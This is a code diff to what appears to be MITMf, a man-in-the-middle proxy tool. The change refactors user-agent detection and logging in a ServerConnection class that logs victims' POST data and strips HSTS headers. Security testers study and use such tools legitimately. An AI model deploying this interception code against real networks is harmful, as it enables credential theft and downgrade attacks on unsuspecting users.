@@ -24,8 +24,8 @@ import zlib
 import gzip
 import StringIO
 import sys
+import core.httpagentparser as hap
 
-from user_agents import parse
 from twisted.web.http import HTTPClient
 from URLMonitor import URLMonitor
 from core.sergioproxy.ProxyPlugins import ProxyPlugins
@@ -72,13 +72,12 @@ class ServerConnection(HTTPClient):
     def sendRequest(self):
         if self.command == 'GET':
             try:
-                user_agent = parse(self.headers['user-agent'])
-                self.clientInfo = "{} [type:{}-{} os:{}] ".format(self.client.getClientIP(), user_agent.browser.family, user_agent.browser.version[0], user_agent.os.family)
+                mitmf_logger.info("{} [type:{} os:{}] Sending Request: {}".format(self.client.getClientIP(), self.clientInfo[1], self.clientInfo[0], self.headers['host']))
             except Exception as e:
-                mitmf_logger.debug("[ServerConnection] Failed to parse client UA: {}".format(e))
-                self.clientInfo = "{} ".format(self.client.getClientIP())
-
-            mitmf_logger.info(self.clientInfo + "Sending Request: {}".format(self.headers['host']))
+                mitmf_logger.debug("[ServerConnection] Unable to parse UA: {}".format(e))
+                mitmf_logger.info("{} Sending Request: {}".format(self.client.getClientIP(), self.headers['host']))
+                pass
+        
             mitmf_logger.debug("[ServerConnection] Full request: {}{}".format(self.headers['host'], self.uri))
 
         self.sendCommand(self.command, self.uri)
@@ -96,15 +95,17 @@ class ServerConnection(HTTPClient):
                 postdata = self.postData.decode('utf8') #Anything that we can't decode to utf-8 isn't worth logging
                 if len(postdata) > 0:
                     mitmf_logger.warning("{} {} Data ({}):\n{}".format(self.client.getClientIP(), self.getPostPrefix(), self.headers['host'], postdata))
-            except UnicodeDecodeError and UnicodeEncodeError:
-                mitmf_logger.debug("[ServerConnection] {} Ignored post data from {}".format(self.client.getClientIP(), self.headers['host']))
-                pass
+            except Exception as e:
+                if ('UnicodeDecodeError' or 'UnicodeEncodeError') in e.message:
+                    mitmf_logger.debug("[ServerConnection] {} Ignored post data from {}".format(self.client.getClientIP(), self.headers['host']))
+                    pass
 
         self.printPostData = True
         self.transport.write(self.postData)
 
     def connectionMade(self):
         mitmf_logger.debug("[ServerConnection] HTTP connection made.")
+        self.clientInfo = hap.simple_detect(self.headers['user-agent'])
         self.plugins.hook()
         self.sendRequest()
         self.sendHeaders()
@@ -133,7 +134,7 @@ class ServerConnection(HTTPClient):
                 self.isCompressed = True
 
         elif (key.lower()== 'strict-transport-security'):
-            mitmf_logger.info("{} Zapped a strict-trasport-security header".format(self.clientInfo))
+            mitmf_logger.info("{} [type:{} os:{}] Zapped a strict-trasport-security header".format(self.client.getClientIP(), self.clientInfo[1], self.clientInfo[0]))
 
         elif (key.lower() == 'content-length'):
             self.contentLength = value
@@ -220,13 +221,6 @@ class ServerConnection(HTTPClient):
                 dregex = re.compile("({})".format("|".join(map(re.escape, sustitucion.keys()))))
                 data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)
 
-            #mitmf_logger.debug("HSTS DEBUG received data:\n"+data)   
-            #data = re.sub(ServerConnection.urlExplicitPort, r'https://\1/', data)
-            #data = re.sub(ServerConnection.urlTypewww, 'http://w', data)
-            #if data.find("http://w.face")!=-1:
-            #   mitmf_logger.debug("HSTS DEBUG Found error in modifications")
-            #   raw_input("Press Enter to continue")
-            #return re.sub(ServerConnection.urlType, 'http://web.', data)
             return data
 
         else:
